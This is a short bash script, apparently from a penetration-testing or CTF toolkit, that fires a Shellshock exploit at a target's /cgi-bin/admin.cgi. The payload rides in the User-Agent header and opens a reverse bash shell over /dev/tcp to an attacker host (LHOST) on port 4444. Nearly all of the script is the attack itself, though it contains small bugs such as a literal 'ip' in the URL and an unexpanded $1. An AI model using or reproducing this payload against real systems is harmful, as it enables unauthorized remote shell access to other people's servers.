#!/bin/bash

if [ -z "$1" ]
then 
	echo 'Enter IP of target'
	return -1 
	exit
fi 

ip=$1 


echo '[+] Sending Exploit to target $1'
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/LHOST/4444 0>&1'" http://ip/cgi-bin/admin.cgi
echo '[+] Did it work?' 


